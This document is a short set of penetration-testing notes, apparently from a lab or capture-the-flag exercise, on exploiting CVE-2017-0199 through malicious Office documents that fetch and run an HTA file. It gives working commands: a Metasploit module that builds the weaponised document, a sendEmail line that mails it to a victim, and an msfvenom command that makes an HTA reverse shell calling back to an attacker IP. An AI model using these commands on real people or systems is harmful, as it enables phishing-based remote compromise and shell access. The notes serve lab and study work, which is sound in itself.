## Overview
1. Attacker sends document with OLE to victim
2. Victim clicks document (or download attachment from email)
3. Document sends GET request to attacker IP to download a malicious HTA file. Once this file is downloaded, victim machine executes it due to logic bug of `mshta.exe`.

## Exploits
* [CVE-2017-0199: In the Wild Attacks Leveraging HTA Handler - Mandiant](https://www.mandiant.com/resources/cve-2017-0199-hta-handler) - using RTF and Word documnets

## Tools
* [CVE-2017-0199 Python exploit toolkit](https://github.com/bhdresh/CVE-2017-0199)

* Metasploit

```bash
# Generate document and run webserver
msfconsole -x "use windows/fileformat/office_word_hta; set srvhost tun0; set filename Procedures.doc; set lhost tun0; run"

# Send generated document to victim and wait for the reverse
# connection in metasploit
sendEmail -t nico@megabank.com -f hacker@kali.com -s reel:25 -u Procedures -o tls=no -a /home/kali/.msf4/local/Procedures.doc -m "See attachment for procedures"
```

## Troubleshooting
The python exploit in github didnt worked for me. When I tried to see in wireshark the network connections, I saw that victim did a `GET` request to attacker, but attacker didnt respond back. Probably there is something wrong on http server implemention?

From other writeups, they didnt use the http server that comes up with the exploit kit but instead they used their own http server.

## Alternatives
* You can generate HTA file via this methods

```bash
# msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=443 -f hta-psh -o msfv.hta
